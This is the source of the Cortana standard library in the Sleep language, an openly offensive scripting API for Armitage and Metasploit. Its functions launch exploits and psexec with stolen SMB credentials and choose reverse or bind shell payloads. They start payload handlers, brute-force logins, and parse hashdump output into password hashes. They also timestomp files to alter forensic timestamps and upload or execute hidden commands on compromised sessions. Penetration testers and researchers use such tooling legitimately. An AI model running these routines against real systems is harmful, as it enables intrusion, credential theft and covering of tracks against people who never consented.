#
# Cortana Standard Library (written in.... Sleep?!?) => YES!
# 

debug(7 | 34);

import armitage.*;
import msf.*;

# setg("varname", "value")
sub setg {
	if ($1 eq "LHOST") {
		call_async("armitage.set_ip", $2);
	}
	cmd_safe("setg $1 $2");
}

sub readg {
	cmd_safe("setg", {
		local('$entry $key $value %rv');
		foreach $entry (parse_table($3, @("Name", "Value"))) {
			($key, $value) = values($entry, @("Name", "Value"));
			fire_event_local("global_ $+ $key", $key, $value);
			%rv[$key] = $value;
		}

		fire_event_local("global", %rv);
	});
}

#
# Route API
#
sub route_add {
	cmd_safe("route add $1 $2 $3");
}

sub route_info {
	local('$host $mask $gate');
	($host, $mask, $gate) = matches("$1", '(.*?)/(.*?) via (.*)');
	return ohash(host => $host, mask => $mask, gateway => $gate);
}

sub route_gateway {
	return [$1 getGateway];
}

sub route_delete {
	cmd_safe("route remove " . join(" ", values(route_info($1))));
}

sub route_temp {
	return [new graph.Route: $1, $2, "-1"];
}

sub route {
	local('$route');
	foreach $route (routes()) {
		if ($route isroute $1) {
			return $route;
		}
	}
}

#
# Services API
#
sub service_ports {
	return keys(host_services($1));
}

sub service_open {
	local('$port $data @r');
	foreach $data (services()) {
		$port = $data['port'];
		if ($port eq $1) {
			push(@r, $data['host']);
		}
	}
	return @r;
}

sub service_data {
	local('$data');
	$data = host_services($1);
	if ($data) {
		return $data[$2];
	}
}

sub service_info {
	local('$data');
	$data = service_data($1, $2);
	if ($data) {
		return $data['info'];
	}
}

sub service_add {
	local('$target $port');
	$target = shift(@_);
	foreach $port (flatten(@_)) {
		cmd_safe("services -a -p $port $target");
	}
}

sub service_delete {
	local('$target $port');
	$target = shift(@_);
	foreach $port (flatten(@_)) {
		cmd_safe("services -d -p $port $target");
	}
}

#
# Host API
#
sub host_os {
	if (size(@_) == 2) {
		call_async("db.report_host", %(host => $1, os_name => $2));
		return $2;
	}
	else if (size(@_) == 3) {
		call_async("db.report_host", %(host => $1, os_name => $2, os_flavor => $3));
		return $2;
	}
	else {
		return host_info($1, 'os_name');
	}
}

sub host_info {
	local('$data');
	$data = host_data($1);
	if ($data !is $null) {
		return $data[$2];
	}
}

sub host_data {
	return hosts()[$1];
}

sub host_sessions {
	return host_info($1, 'sessions');
}

sub host_session {
	local('@s $sid');
	@s = reverse(sortd(keys(host_sessions($1))));
	foreach $sid (@s) {
		if (-ismeterpreter $sid) {
			if (-isready $sid) {
				return $sid;
			}
		}
		else {
			return $sid;
		}
	}
	return $null;
}

sub host_services {
	return host_info($1, 'services');
}

sub host_addresses {
	return keys(hosts());
}

sub host_add {
	cmd_safe("hosts -a " . join(" ", flatten(@_)));
}

sub host_delete {
	cmd_safe("hosts -d " . join(" ", flatten(@_)));
}

on locked_db_import_lock_internal {
	when('console_db_import', lambda({
		fire_event_local("db_import", $hostf);
		unlock("db_import_lock_internal");
	}, $hostf => $1));
	cmd_async("db_import \" $+ $1 $+ \"");
}

sub host_import {
	# metasploit freaks out when two consoles try to import data at the same time. To minimize this problem,
	# let's obtain a global lock and release it once the import is finished. This way, all scripts importing their
	# stuff can do so without stepping on eachother.
	lock("db_import_lock_internal", 1, $1);
}

#
# Session API
#

# session_ids() - returns an array of all session identifiers
sub session_ids {
	return keys(sessions());
}

# session_data($sid) - returns all of the known data about a particular session
sub session_data {
	return sessions()[$1];
}

# session_host($sid) - returns the host associated with this session
sub session_host {
	local('$session');
	$session = session_data($1);
	if ($session) {
		return $session["host"];
	}
}

# session_type($sid) - returns the type of session (meterpreter vs. shell)
sub session_type {
	local('$session');
	$session = session_data($1);
	if ($session) {
		return $session["type"];
	}
}

# session_os($sid) - returns the operating system associated with this session
sub session_os {
	return host_os(session_host($1));
}

# session_close($sid) - kills this session 
sub session_close {
	call_async("session.stop", $1);
}

sub session_exploit {
	local('$session');
	$session = session_data($1);
	if ($session) {
		return $session["via_exploit"];
	}
}

#
# credentials API
#

sub _fix_pass {
	return replace(strrep($1, '\\', '\\\\'), '(\p{Punct})', '\\\\$1');
}

# credential_add("host", "port", "user, "pass", "type")
sub credential_add {
	cmd_safe("creds -a $1 -p $2 -t $5 -u $3 -P " . _fix_pass($4));
}

# credential_delete("host", port, "user", "pass");
sub credential_delete {
	cmd_safe("creds -a $1 -p $2 -u $3 -P " . _fix_pass($4) . " -d");
}

sub credential_list {
	local('$credential $host $user $pass %r');
	foreach $credential (credentials()) {
		($host, $user, $pass) = values($credential, @("host", "user", "pass"));
		if ($host eq $1) {
			%r[$user] = $pass;
		}
	}
	return %r;
}

#
# Metasploit Loot!
#
sub loot_list {
	local('$loot @r');
	foreach $loot (loots()) {
		if ($loot['host'] eq $1) {
			push(@r, $loot);
		}
	}
	return @r;
}

sub loot_get {
	return file_content($1['path']);
}

#
# Jobs API
#
sub jobs {
	return call('job.list');
}

sub job_ids {
	return keys(jobs());
}

sub job_kill {
	call_async("job.stop", $1);
}

sub job_info {
	return call('job.info', $1);
}

#
# Modules API
#

# post("module", "session", "options")
sub post {
	local('%o $3');
	if ($3) {
		%o = copy($3);
	}
	%o['SESSION'] = "$2";
	return launch('post', $1, %o);
}

# auxiliary("module", @hosts, "options")
sub auxiliary {
	local('%o $3');
	if ($3) {
		%o = copy($3);
	}
	%o['RHOSTS'] = join(", ", $2);
	return launch('auxiliary', $1, %o);
}

# handler("payload", "port", %options) - start a listener for a particular payload
sub multi_handler {
	warn("&multi_handler is deprecated. Please use &handler: " . @_);
	return invoke(&handler, @_);	
}

sub handler {
	local('%o $3 $key $value');

	# default options
	%o['PAYLOAD'] = $1;
	%o['LPORT']   = $2;
	%o['DisablePayloadHandler'] = 'false';
	%o['ExitOnSession']         = 'false';

	# let the user override anything
	if ($3) {
		foreach $key => $value ($3) {
			%o[$key] = $value;
		}
	}

	# make sure LHOST is correct
	if ('LHOST' !in %o) {
		if ("*http*" iswm $1) {
			%o['LHOST']   = lhost();
		}
		else {
			%o['LHOST']   = '0.0.0.0';
		}
	}

	# let's do it...
	return launch('exploit', 'multi/handler', %o);
}

# generate("payload", host, port, %options, "output")
sub generate {
	local('%o $4');
	if ($4) {
		%o = copy($4);
	}
	%o['LHOST']  = $2;
	%o['LPORT']  = $3;
	%o['Format'] = $5;

	return call("module.execute", "payload", $1, %o)["payload"];
}

# login("module", @hosts, "user", "pass", %options)
sub login {
	local('%o $5');
	if ($5) {
		%o = copy($5);
	}
	%o["USERNAME"] = $3;
	%o["PASSWORD"] = $4;
	%o["RHOSTS"]   = join(", ", $2);

	return launch("auxiliary", $1, %o);
}

# psexec("host", "DOMAIN", "user", "pass", %options)
sub psexec {
	local('%o $5');
	if ($5) {
		%o = copy($5);
	}
	%o['SMBDomain'] = $2;
	%o['SMBUser']   = $3;
	%o['SMBPass']   = $4;

	return exploit("windows/smb/psexec", $1, %o);
}

sub options {
	return call('module.options', $1, $2);
}

sub info {
	return call('module.info', $1, $2);
}

sub modules {
	local('@modules $1 $2');
	@modules = call("module. $+ $1")['modules'];
	if ($2) {
		foreach $module (@modules) {
			if ($2 !iswm $module) {
				remove();
			}
		}
	}
	return @modules;
}

sub launch {
	# make sure everything is a string...
	local('$key $value $options');
	$options = copy($3);
	foreach $key => $value ($options) {
		$value = "$value";
	}

	call_async("module.execute", $1, $2, $options);
}

# exploit("module", "address", %options, [exploit target], [reverse connect?])
sub exploit {
	return invoke(&_exploit, filter_data_array("exploit", @_));
}

sub random_port {
        return int( 1024 + (rand() * 1024 * 30) );
}

sub _exploit {
	local('%o $4 $5 $3 $key $value');

	# setup the options we want based on the user parameters...
	%o['RHOST']   = $2;
	%o['PAYLOAD'] = best_payload($2, $1, $5);
	%o['TARGET']  = iff($4, $4, '0');

	# we should have a global LHOST value. If our value is localhost, then rely on the global value.
	if (lhost() ne "127.0.0.1") {
		%o['LHOST']   = lhost();
	}

	if (%o['PAYLOAD'] ne "windows/meterpreter/reverse_tcp") {
		%o['LPORT'] = random_port();
	}

	# now, install all of the user provided options
	if ($3) {
		foreach $key => $value ($3) {
			%o[$key] = $value;
		}
	}

	call_async('module.execute', 'exploit', $1, %o);
}

# best_payload(host, exploit, reverse preference)
sub best_payload {
	local('$compatible $os $win');
	$compatible = call("module.compatible_payloads", $2)["payloads"];
	$os = host_os($1);
	$win = iff($os eq "Windows" || "windows" isin $2);

	if ($3) {
		if ($win && "windows/meterpreter/reverse_tcp" in $compatible) {
			return "windows/meterpreter/reverse_tcp";
		}
		else if ($win && "windows/shell/reverse_tcp" in $compatible) {
			return "windows/shell/reverse_tcp";
		}
		else if ("java/meterpreter/reverse_tcp" in $compatible) {
			return "java/meterpreter/reverse_tcp";
		}
		else if ("java/shell/reverse_tcp" in $compatible) {
			return "java/shell/reverse_tcp";
		}
		else if ("java/jsp_shell_reverse_tcp" in $compatible) {
			return "java/jsp_shell_reverse_tcp";
		}
		else if ("php/meterpreter_reverse_tcp" in $compatible) {
			return "php/meterpreter_reverse_tcp";
		}
		else {
			return "generic/shell_reverse_tcp";
		}
	}
	
	if ($win && "windows/meterpreter/bind_tcp" in $compatible) {
		if (-isipv6 $1) {
			return "windows/meterpreter/bind_ipv6_tcp";
		}
		else {
			return "windows/meterpreter/bind_tcp";
		}
	}
	else if ($win && "windows/shell/bind_tcp" in $compatible) {
		if (-isipv6 $1) {
			return "windows/shell/bind_ipv6_tcp";
		}
		else {
			return "windows/shell/bind_tcp";
		}
	}
	else if ("java/meterpreter/bind_tcp" in $compatible) {
		return "java/meterpreter/bind_tcp";
	}
	else if ("java/shell/bind_tcp" in $compatible) {
		return "java/shell/bind_tcp";
	}
	else if ("java/jsp_shell_bind_tcp" in $compatible) {
		return "java/jsp_shell_bind_tcp";
	}
	else {
		return "generic/shell_bind_tcp";
	}
}

#
# DB API
#
sub db_destroy {
	call_async("db.clear");
}

#
# Datastore API
# A serialized object data store built on top of Metasploit's notes table
#

# @array = data_list('key')
sub data_list {
	return map({ 
		local('$raw $buffer $object');
		$raw = $1['data'];
		$buffer = allocate(1024);
		writeb($buffer, [msf.Base64 decode: $raw]);
		closef($buffer);
		$object = readObject($buffer);
		closef($buffer);
		return $object;
	}, call("db.key_values", $1)["values"]);
}

# data_delete('key') -- clears all data associated with the specified key
sub data_delete {
	call("db.key_clear", $1);
}

# data_clear('key') -- clears all data associated with the specified key
sub data_clear {
	data_delete($1);
}

# data_add('key', $object) -- appends value into the database... 
sub data_add {
	local('$buffer $data');
	# serialize the data...
	$buffer = allocate(1024);
	writeObject($buffer, $2);
	closef($buffer);
	$data = [msf.Base64 encode: cast(readb($buffer, -1), 'b')];
	closef($data);
	call("db.key_add", $1, $data);
}

#
# a publish/query/subscribe API
#

# publish("key", $object)
sub publish {
	local('$data');
	$data = [msf.Base64 encode: cast(pack("o", $2, 1), 'b')];
	call_async("armitage.publish", $1, "$data $+ \n");
}

# query("key", "index")
sub query {
	local('$r @r $result');
	$r = call("armitage.query", $1, $2)['data'];
	if ($r ne "") {
		foreach $result (split("\n", $r)) {
			push(@r, unpack("o", [msf.Base64 decode: $result])[0]);
		}
	}
	return @r;
}

# subscribe("key", "index", "1s/5s/10s/15s/30s/1m/5m/10m/15m/20m/30m/60m")
sub subscribe {
	on("heartbeat_ $+ $3", lambda({
		local('$result');
		foreach $result (query($key, $index)) {
			fire_event_local($key, $result, $index);
		}
	}, $key => $1, $index => $2));
}

#
# Shell shock?
#

sub thread {
        local('$thread');
        $thread = [new ArmitageThread: $1];
        [$thread start];
}

# shell_upload(sid, src file, dst file)
sub shell_upload {
	local('$handle $bytes $string $t $start $n $cancel $upload');
	($sid, $src, $dst) = @_;

	s_cmd($1, "rm -f $3", {});
	$handle = openf($src);

	$upload = allocate(lof($src) * 5);

	while $bytes (readb($handle, 768)) {
		# convert the bytes to octal escapes
		$string = join("", map({
			return "\\" . formatNumber($1, 10, 8);
		}, unpack("B*", $bytes)));

		println($upload, "`which printf` \" $+ $string $+ \" >> $+ $dst");

		if (available($handle) == 0) {
			break;
		}
	}

	closef($upload);
	closef($handle);
	s_cmd($sid, readb($upload, -1), lambda({
		fire_event_local("shell_upload", $sid, $dst);
	}, \$sid, \$dst));
	closef($upload);
}

#
# meterpreter parsing commands...
#
sub parse_event {
        local('$type $time $nick $text $d');
        if ($1 ismatch '(.*?) \<(.*?)\> (.*)') {
                ($time, $nick, $text) = matched();
                $nick = ["$nick" trim];
                $type = "message";

        }
        else if ($1 ismatch '(.*?) \* (.*?) (.*)') {
                ($time, $nick, $text) = matched();
                $type = "action";
        }
        else if ($1 ismatch '(.*?) ... (.*) joined') {
                ($time, $nick) = matched();
                $type = "join"
        }

        if ($time ne "") {
                $d = parseDate("hh:mm:ss ddMMyyyy", $time . " " . formatDate("ddMMyyyy"));
        }
        return @($type, $d, $nick, $text);
}

sub parse_route {
	return parse_table($1, @('Subnet', 'Netmask', 'Gateway', 'Metric', 'Interface'));
}

sub parse_ls {
	foreach $line (split("\n", $1)) {
		if ("*Operation failed*" iswm $line) {
			throw $line;
		}
		else if ($line ismatch 'Listing: (.*?)' || $line ismatch 'No entries exist in (.*?)') {
			($path) = matched();
		}
		else {
			($mode, $size, $type, $last, $name) = split('\s{2,}', $line);

			if ($size ismatch '\d+' && $name ne "." && $name ne "..") {
				push(@files, %(name => $name, type => $type, size => iff($type eq "dir", "", $size), modified => $last, mode => $mode));
			}
		}
	}
	return @($path, @files);
}

sub convert_date {
        if ($1 ismatch '\d\d\d\d-\d\d-\d\d \d\d:\d\d:\d\d .*') {
                return parseDate('yyyy-MM-dd HH:mm:ss Z', $1);
        }
        else {
                return parseDate("EEE MMM dd HH:mm:ss Z yyyy", $1);
        }
}

# parse_table("string", @(columns))
sub parse_table {
	local('$cols $regex $line @results $template %r $row $col $matches');

	# create the regex to hunt for our table...
	$cols = copy($2);
	map({ $1 = '(' . $1 . '\s+)'; }, $cols);
	$cols[-1] = '(' . $2[-1] . '.*)';
	$regex = join("", $cols);

	# search for stuff
	foreach $line (split("\n", $1)) {
		$line = ["$line" trim];

		if ($line ismatch $regex) {
			# ok... construct a template to parse our fixed width rows.
			$matches = matched();
			map({ $1 = 'Z' . strlen($1); }, $matches);
			$matches[-1] = 'Z*';
			$template = join("", $matches);
		}
		else if ($line eq "" && $template !is $null) {
			# oops, row is empty? we're done then...
			return @results;
		}
		else if ($template !is $null && "---*" !iswm $line) {
			# extract the row from the template and add to our results
			$row = map({ return [$1 trim]; }, unpack($template, $line));
			%r = %();
			foreach $col ($2) {
				%r[$col] = iff(size($row) > 0, shift($row), "");
			}
			push(@results, %r);
		}
	}
	return @results;
}

# m_timestomp("sid", "file", %attributes)
sub m_timestomp {
	local('$key $value %switches %switches $s $v');
	%switches = %(Modified => '-m', Accessed => '-a', Created => '-c');
	%switches["Entry Modified"] = '-e';

	foreach $key => $value ($3) {
		$s = %switches[$key];
		if ($s !is $null) {
			$v = formatDate($value, 'MM/dd/yyyy HH:mm:ss');
			m_cmd($1, "timestomp \" $+ $2 $+ \" $s \" $+ $v $+ \"");
		}
	}
}

sub parse_timestomp {
	local('$line $type $value %attribs');
	foreach $line (split("\n", $1)) {
		if ($line ismatch '([MACE].*?)\s*: (.*)') {
			($type, $value) = matched();
			%attribs[["$type" trim]] = convert_date($value);
		}
	}
	return %attribs;
}

sub parse_ps {
	local('@t');
	@t = parse_table($1, @("PID", "Name", "Arch", "Session", "User", "Path"));
	if (size(@t) == 0) {
		return parse_table($1, @("PID", "PPID", "Name", "Arch", "Session", "User", "Path"));
	}
	else {
		return @t;
	}
}

sub parse_hashdump {
	local('$line $user $gid $hash');

	foreach $line (split("\n", $1)) {
		if ($line ismatch '(.*?):(\d+):([a-zA-Z0-9]+:[a-zA-Z0-9]+).*?') {
			($user, $gid, $hash) = matched();

			# strip any funky characters that will cause this call to throw an exception
			$user = replace($user, '\P{Graph}', "");

			push(@r, %(user => $user, password => $hash, gid => $gid));
		}
	}
	return @r;
}

#
# Meterpreter Shell API
#
sub m_exec_local {
	m_exec($1, $2, 1, $3);
}

sub m_exec {
	local('$command $doit $first $rest $3 $args');
	$command = strrep($2, '\\', '\\\\', '"', '\\"');

	if (session_os($1) eq "Microsoft Windows") {
		if ($3) {
			$doit = "execute -t -H -c -m -f \" $+ $command $+ \" -a \" $+ $4 $+ \"";
			$command = strrep(getFileName($command), ".exe", "");
		}
		else {
			$doit = "execute -t -H -c -f cmd.exe -a \"/C $command $+ \"";
		}
	}
	else {
		if (indexOf($command, ' ')) {
			$first = substr($command, 0, indexOf($command, ' '));
			$rest  = substr($command, strlen($first) + 1);
			$doit = "execute -t -H -c -f \" $+ $command $+ \"";
		}
		else {
			$doit = "execute -t -H -c -f $command";
		}
	}

	m_cmd($1, $doit, lambda({
		if ($0 eq "timeout") {
			fire_event_local("exec_timeout", $1, $command);
		}
		else if ($3 ismatch '(?s:.*Channel (\d+) created.*?)') {
			local('$channel $buffer');
			($channel) = matched();
			$buffer = allocate(1024);
			m_cmd($1, "read $channel", lambda({
				local('$output $check $temp');
				$temp = split("\n", $3);
				$check = $temp[0];
				shift($temp);
				if ($check eq "[-] No data was returned.") {
					closef($buffer);
					$output = readb($buffer, -1);
					$output = ["$output" trim];
					closef($buffer);
					local('$name');
					$name = lc(split('\s+', $command)[0]);
					fire_event_local("exec_ $+ $name", $1, $command, $output);
					fire_event_local("exec", $1, $command, $output);
				}
				else {
					writeb($buffer, join("\n", $temp));
					m_cmd($1, "read $channel", $this);
				}
			}, \$command, \$channel, \$buffer));
		}
		else {
			fire_event_local("exec_error", $1, $command, ["$3" trim]);
		}
	}, \$command));
}

#
# file API
#

# $remote_file = file_put("/local/path/to/file")
sub file_put {
	if ($mclient is $client) {
		return $1;
	}
	else {
		local('$handle %r $data');

		$handle = openf($1);
		$data = readb($handle, -1);
		closef($handle);

		%r = call("armitage.upload", getFileName($1), $data);
		return %r['file'];
	}
}	

# $file = file_get("/remote/path/to/file", ["local file"])
sub file_get {
	local('$file $handle $2');
	$file = iff($2, $2, getFileName($1));
	$handle = openf("> $+ $file");
	writeb($handle, file_content($1));
	closef($handle);
	return $file;
}

# $data = file_content("/remote/path/to/file")
sub file_content {
	if ($mclient is $client) {
		local('$handle $data');
		$handle = openf($1);
		$data = readb($handle, -1);
		closef($handle);
		return $data;
	}
	else {
		local('%r');
		%r = call("armitage.download_nodelete", $1);
		return %r['data'];
	}
}

#
# add an API for downloading files through meterpreter.
#
sub m_downloads {
	if ($client is $mclient) {
		return _list_downloads(log_resource("../downloads"));
	}
	else {
		return call($mclient, "armitage.downloads");
	}
}

sub m_cd {
	local('$path @paths');

	# get us where we need to go...
	@paths = split('\\\\', $2);
	foreach $path (@paths) {
		if ([$path endsWith: ':']) {
			m_cmd($1, "cd \" $+ $path $+ \\\\\"");
		}
		else {
			m_cmd($1, "cd \" $+ $path $+ \"");
		}
	}
}

sub m_download {
	local('$path @paths $host $dest $file');

	# who is this for?
	$host = session_host($1);

	# extract path and file, change directory to the file location...
	@paths = split('\\\\', $2);
	$file = pop(@paths);
	m_cd($1, join('\\', @paths));

	# issue a download command...
	$dest = _download_directory($host, join('/', @paths));
	m_cmd($1, "download \" $+ $file $+ \" \" $+ $dest $+ \"");
}

sub _download_directory {
	if ($client is $mclient) {
		local('@dirs $start $dir');
		$start = _data_directory();
		push(@dirs, "downloads");
		addAll(@dirs, @_);

		foreach $dir (@dirs) {
			#if (isWindows()) {
			#	$dir = strrep($dir, "/", "\\", ":", "");
			#}
			$start = getFileProper($start, $dir);
		}
		return $start;
	}
	else {
		return "downloads/" . join("/", @_);
	}
}

# list local downloads...
sub _list_downloads {
	this('%types');
	local('$files $root $findf $hosts $host');
	$files = @();
	$root = $1;
	$findf = {
		if (-isDir $1) {
			return map($this, ls($1));
		}
		else {
			# determine the file content type
			local('$type $handle $data');
			if ($1 in %types) {
				$type = %types[$1];				
			}
			else {
				$handle = openf($1);
				$data = readb($handle, 1024);
				closef($handle);
				if ($data ismatch '\p{ASCII}*') {
					$type = "text/plain";
				}
				else {
					$type = "binary";
				}
				%types[$1] = $type;
			}

			# return a description of the file.
			return %(
				host => $host,
				name => getFileName($1),
				size => lof($1),
				updated_at => lastModified($1),
				location => $1,
				path => substr(strrep(getFileParent($1), $root, ''), 1),
				content_type => $type
			);
		}
	};

	$hosts = map({ return getFileName($1); }, ls($root));
	foreach $host ($hosts) {
		addAll($files, flatten(
			map(
				lambda($findf, $root => getFileProper($root, $host), \$host, \%types),
				ls(getFileProper($root, $host))
			)));
	}

	return $files;
}

sub m_upload {
	m_cmd($1, 'upload "' . strrep(getFileProper($2), '\\', '\\\\') . '" "' . strrep(getFileName($2), '\\', '\\\\') . '"');
}

#
# misc...
#
sub script_resource {
	return getFileProper(getFileParent($__script__), $1);
}

sub delete_later {
	[[new java.io.File: getFileProper($1)] deleteOnExit];
}

sub parse_msf_date {
	if ($1 ismatch '\d\d\d\d-\d\d-\d\d \d\d:\d\d:\d\d .*') {
		return parseDate('yyyy-MM-dd HH:mm:ss Z', $1);
	}
	else {
		return parseDate("EEE MMM dd HH:mm:ss Z yyyy", $1);
	}
}

sub format_msf_date {
	return formatDate($1, 'yyyy-MM-dd HH:mm:ss Z');
}

sub _data_directory {
	local('$f');

	if ([$preferences getProperty: "armitage.log_data_here.folder", ""] eq "") {
		[$preferences setProperty: "armitage.log_data_here.folder", getFileProper(systemProperties()["user.home"], ".armitage")];
	}

	return [$preferences getProperty: "armitage.log_data_here.folder"];
}

sub log_resource {
	local('$start $args');
	$start = getFileProper(_data_directory(), formatDate("yyMMdd"));
	$args  = copy(@_);
	while (size($args) > 0) {
		mkdir($start);
		$start = getFileProper($start, shift($args));
	}
	return $start;
}
